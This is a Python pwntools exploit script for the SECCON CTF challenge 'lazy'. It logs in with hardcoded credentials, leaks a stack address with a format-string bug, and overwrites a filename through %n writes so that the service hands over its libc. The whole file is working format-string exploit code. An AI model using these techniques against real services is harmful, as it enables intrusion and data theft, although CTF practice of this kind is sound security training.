#!/usr/bin/python2
from pwn import *
from pwn import u32, u64, p32, p64
from fs_lib import *
import sys

LOCAL = True
WAIT = False
PRELOAD = False
SHOULD_ELF = True
STRACE = False
LTRACE = False
if "remote" in sys.argv:
    LOCAL = False
elif "wait" in sys.argv:
    WAIT = True
if "preload" in sys.argv:
    PRELOAD = True
if "noelf" in sys.argv:
    SHOULD_ELF = False
if "strace" in sys.argv:
    STRACE = True
if "ltrace" in sys.argv:
    LTRACE = True

elf = None
libc = None


def get_conn():
    global elf  # pylint: disable=global-statement
    global libc  # pylint: disable=global-statement

    if SHOULD_ELF:
        elf = ELF(PROG_NAME)
        if LIBC_NAME != '':
            libc = ELF(LIBC_NAME)

    if LOCAL:
        env = os.environ.copy()
        env["DEBUG"] = "1"
        if LIBC_NAME and PRELOAD:
            env["LD_PRELOAD"] = LIBC_NAME
            log.info("LD_PRELOAD = %s" % env)
        cmd = []
        if STRACE:
            cmd.append("strace")
        elif LTRACE:
            cmd.append("ltrace")
        cmd.append(PROG_NAME)
        s = process(cmd, env=env)
        if WAIT:
            pause()
    else:
        s = remote(HOST, PORT)
    return s

# =================
# The exploit
context.clear(log_level='info', arch="amd64", kernel='amd64', os='linux')

PROG_NAME = "./lazy"
LIBC_NAME = ""
HOST = "lazy.chal.seccon.jp"
PORT = 33333


def go():
    s = get_conn()
    username = "_H4CK3R_"
    password = "3XPL01717"

    s.sendline("2")
    s.sendline(username)
    s.sendline(password)
    s.sendline("4")

    # download binary
    # s.sendline("lazy")
    # s.recvuntil("bytes")
    # lazy_elf = s.recvall()
    # with open("lazy", "wb") as f:
    #     f.write(lazy_elf)
    #     f.close()

    leak_to_input_offset = 0x60
    leak_fmt = "%10$p"
    input_offset = 6

    s.sendline(leak_fmt)
    s.recvuntil("Filename : ")
    leak = int(s.recvline().strip(), 16)
    input_addr = leak - leak_to_input_offset

    log.info("leak = {}".format(hex(leak)))
    log.info("input @ {}".format(hex(input_addr)))

    s.sendline("4")
    s.sendline("libc")
    
    # addresses to write on
    sequence = "".join([p64(input_addr+i) for i in range(8)])
    sequence += p64(input_addr+8)

    fs = FormatString()
    # first address will be at offset 23 (%23$hhn)
    fs.write(23, u64("libc.so."), step=1)

    payload = fs.payload()
    # this is a dirty hack, but it got the job done
    payload += "%" + str(0x3636 - fs.bytes_written_so_far) + "x" + "%31$n"
    # pad the input so the the addresses are in a known  
    # location at a specific offset
    payload += "\x00" * (136 - len(payload)) + sequence

    s.sendline("4")
    s.sendline(payload)

    # download libc
    s.recvuntil("bytes")
    libc_bin = s.recvall()
    with open("libc.so.6", "wb") as f:
        f.write(libc_bin)
        f.close()

    # GNU C Library (GNU libc) stable release version 2.23, by Roland McGrath et al.

    s.interactive()

go()